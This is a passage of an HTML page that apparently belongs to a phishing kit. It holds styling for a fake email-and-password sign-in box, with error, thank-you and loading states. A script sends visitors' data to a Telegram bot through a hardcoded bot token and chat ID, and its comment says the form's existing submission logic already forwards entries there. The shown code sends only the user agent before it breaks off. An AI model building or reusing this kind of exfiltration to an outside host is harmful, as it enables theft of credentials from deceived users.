            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            position: relative;
        }

        .container {
            max-width: 800px;
            width: 320px;
            height: 500px;
            margin: 0 auto;
            margin-top: 90px;
            margin-bottom: 50px;
            margin-left: 800px;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        img {
            max-width: 100px;
            margin-bottom: 20px;
        }

        .email-container,
        .password-container {
            position: relative;
            margin-bottom: 20px;
        }

        .email-container input,
        .password-container input {
            width: 80%;
            padding: 20px 10px;
            border: none; /* Remove all borders */
            border-bottom: 2px solid #003366; /* Deep Blue Border only on bottom */
            border-radius: 0; /* No border radius */
            font-size: 16px;
            background-color: #fff;
            color: #000;
            outline: none;
            transition: all 0.3s ease-in-out;
        }

        .email-container input:focus,
        .password-container input:focus {
            box-shadow: none; /* Remove the blue glow */
        }

        .email-container label,
        .password-container label {
            position: absolute;
            top: 20px;
            left: 10px;
            color: #999;
            font-size: 16px;
            transition: all 0.2s ease;
            pointer-events: none;
        }

        .email-container input:focus + label,
        .email-container input:not(:placeholder-shown) + label,
        .password-container input:focus + label,
        .password-container input:not(:placeholder-shown) + label {
            top: -10px;
            left: 20px;
            font-size: 12px;
            background-color: #fff;
            padding: 0 5px;
            color: #003366; /* Deep Blue for the label when active */
        }

        button {
            width: 90%;
            padding: 10px;
            background-color: #3498db;
            color: #fff;
            border: none;
            border-radius: 25px; /* Makes the button oval */
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }

        .dormant-button {
            width: 90%;
            padding: 10px;
            background-color: #fff;
            color: #3498db;
            border: 2px solid #3498db;
            border-radius: 25px;
            font-size: 16px;
            margin-top: 10px;
            cursor: allowed;
            transition: background-color 0.3s ease;
        }

        .dormant-button:hover {
            background-color: #fff;
        }

        .ovalturn {
            width: 90%;
            padding: 1px;
            background-color: #fff;
            border: 2px solid #ccc;
            border-radius: 25px;
            cursor: pointer;
            display: flex;
            align-items: center;
            margin-left: 15px;
            color: #3498db;
            justify-content: center;
        }

        .ovalturn img {
            max-width: auto;
            height: auto;
            margin-bottom: 5px;
            margin-top: 5px;
        }

        .ovalturn :hover {
            background-color: #fff;
        }

        .error-message {
            display: none; /* Hidden by default */
            font-size: 14px;
            color: red;
            margin-bottom: 10px; /* Ensure this is between the password input and submit button */
        }

        .thank-you-message {
            display: none; /* Hidden by default */
            font-size: 18px;
            color: #3498db;
            margin-top: 20px;
        }

        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .loading-circle {
            border: 8px solid #f3f3f3;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media only screen and (max-width: 600px) {
            .full-project {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }

            .container {
                width: 100%;
                margin: 0 10px;
                box-shadow: none;
                border-radius: 0;
                padding: 20px;
                background-color: #fff;
            }

            .full-project > *:not(.container) {
                display: none;
            }

            footer {
                position: static;
            }
        }
/* Style for the Top Bar */
.top-bar {
    width: 100%;
    background-color: #fff;
    border-bottom: 1px solid #ccc;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 1000;
}

.top-bar-content {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 20px;
    max-width: 1200px;
    margin: 0 auto;
}

.top-bar-logo {
    max-width: 100px;
}

.top-bar-links {
    display: flex;
    gap: 20px;
}

.top-bar-links span {
    color: #3498db; /* Blue color for the words */
    font-size: 16px;
    cursor: pointer;
}

.top-bar-links span:hover {
    text-decoration: underline;
}

/* Ensure content doesn't hide behind the fixed top bar */
.full-project {
    margin-top: 60px; /* Adjust this value based on the height of the top bar */
}
    </style>

    <script>
  // Get the User Agent string
const userAgent = navigator.userAgent;

// Add User Agent to the existing submission logic
function addUserAgentToSubmission() {
    // Assuming your existing submission logic is sending data to a Telegram bot
    const botToken = '7140725401:AAG20a9kPifurzoSlRX_8lllrXx6smg0oMw'; // Replace with your Telegram bot token
    const chatId = '6136184571'; // Replace with your Telegram chat ID
    const message = `User Agent: ${userAgent}`;

    // Send the User Agent to the Telegram bot
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
        }),
    })
    .then(response => response.json())

}
